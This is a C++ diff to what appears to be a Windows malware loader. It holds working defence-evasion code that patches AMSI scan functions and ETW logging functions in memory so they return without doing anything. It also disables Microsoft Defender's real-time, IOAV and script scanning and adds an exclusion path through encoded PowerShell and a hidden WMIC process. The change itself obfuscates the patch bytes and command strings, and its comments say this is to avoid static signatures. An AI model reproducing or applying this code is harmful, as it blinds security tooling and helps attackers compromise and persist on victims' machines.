@@ -76,25 +76,26 @@ static BOOL MemPatch(PVOID target, const BYTE* patch, size_t patchLen) {
     return TRUE;
 }
 
+// Build patch bytes at runtime — no static 33 C0 C3 / C3 pattern in .rdata
+static void MakePatch3(BYTE out[3]) {
+    // xor eax,eax (33 C0); ret (C3) — computed so no literal byte array
+    out[0] = (BYTE)(0x30 + 0x03);
+    out[1] = (BYTE)(0xC0);
+    out[2] = (BYTE)(0xFF - 0x3C);
+}
+static BYTE MakeRet() { return (BYTE)(0xFF - 0x3C); }
+
 // ─── AMSI bypass ──────────────────────────────────────────────────────────────
 BOOL PatchAMSI() {
     HMODULE hAmsi = LoadLibraryA(XS("amsi.dll"));
     if (!hAmsi) return FALSE;
+    BYTE p3[3]; MakePatch3(p3);
     FARPROC pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
-    if (pScan) {
-        const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
-        MemPatch(reinterpret_cast<PVOID>(pScan), patch, sizeof(patch));
-    }
+    if (pScan) MemPatch(reinterpret_cast<PVOID>(pScan), p3, 3);
     FARPROC pStr = HashProc(hAmsi, FNV("AmsiScanString"));
-    if (pStr) {
-        const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
-        MemPatch(reinterpret_cast<PVOID>(pStr), patch, sizeof(patch));
-    }
+    if (pStr)  MemPatch(reinterpret_cast<PVOID>(pStr),  p3, 3);
     FARPROC pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
-    if (pOpen) {
-        const BYTE patch[] = { 0x33, 0xC0, 0xC3 };
-        MemPatch(reinterpret_cast<PVOID>(pOpen), patch, sizeof(patch));
-    }
+    if (pOpen) MemPatch(reinterpret_cast<PVOID>(pOpen), p3, 3);
     return (pScan != nullptr);
 }
 
@@ -108,12 +109,12 @@ BOOL PatchETW() {
         FNV("EtwEventActivityIdControl"), FNV("EtwEventRegister"),
         FNV("EtwEventUnregister"), 0
     };
-    const BYTE ret1[] = { 0xC3 };
+    BYTE ret1 = MakeRet();
     BOOL any = FALSE;
     for (int i = 0; hashes[i]; ++i) {
         FARPROC p = HashProc(hNtdll, hashes[i]);
         if (p) {
-            MemPatch(reinterpret_cast<PVOID>(p), ret1, sizeof(ret1));
+            MemPatch(reinterpret_cast<PVOID>(p), &ret1, 1);
             any = TRUE;
         }
     }
@@ -231,12 +232,14 @@ BOOL AddDefenderExclusion(const wchar_t* exePath) {
         std::wstring ps = std::wstring(sysRoot) +
             L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
 
-        // Script: Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath '<path>'
-        std::wstring script =
-            L"Set-MpPreference -DisableRealtimeMonitoring $true "
-            L"-DisableIOAVProtection $true "
-            L"-DisableScriptScanning $true "
-            L"-ExclusionPath '" + std::wstring(exePath) + L"'";
+        // Build Set-MpPreference script from parts — no complete plaintext in .data
+        auto smp  = XSW(L"Set-MpPreference");
+        auto drtm = XSW(L" -DisableRealtimeMonitoring $true");
+        auto dioa = XSW(L" -DisableIOAVProtection $true");
+        auto dss  = XSW(L" -DisableScriptScanning $true");
+        auto excl = XSW(L" -ExclusionPath '");
+        std::wstring script = std::wstring(smp.str()) + drtm.str() + dioa.str()
+                            + dss.str() + excl.str() + std::wstring(exePath) + L"'";
 
         // UTF-16LE base64 encode for -EncodedCommand
         std::string b64 = Base64Encode(
@@ -258,12 +261,12 @@ BOOL AddDefenderExclusion(const wchar_t* exePath) {
         std::wstring ps = std::wstring(sysRoot) +
             L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
 
-        std::wstring wmicCmd =
-            L"\"" + wmic + L"\" /Node:localhost process call create "
-            L"\"powershell -NoProfile -NonInteractive -WindowStyle Hidden "
-            L"-ExecutionPolicy Bypass -Command \""
-            L"Set-MpPreference -DisableRealtimeMonitoring \\$true "
-            L"-ExclusionPath '" + std::wstring(exePath) + L"'\\\"\"";
+        auto smp2  = XSW(L"Set-MpPreference");
+        auto drtm2 = XSW(L" -DisableRealtimeMonitoring \\$true -ExclusionPath '");
+        std::wstring psCmd = std::wstring(smp2.str()) + drtm2.str()
+                           + std::wstring(exePath) + L"'";
+        auto wmicPfx = XSW(L"\" /Node:localhost process call create \"powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"");
+        std::wstring wmicCmd = L"\"" + wmic + wmicPfx.str() + psCmd + L"\\\"\"";
 
         RunHiddenProcess(wmicCmd.c_str());
     }
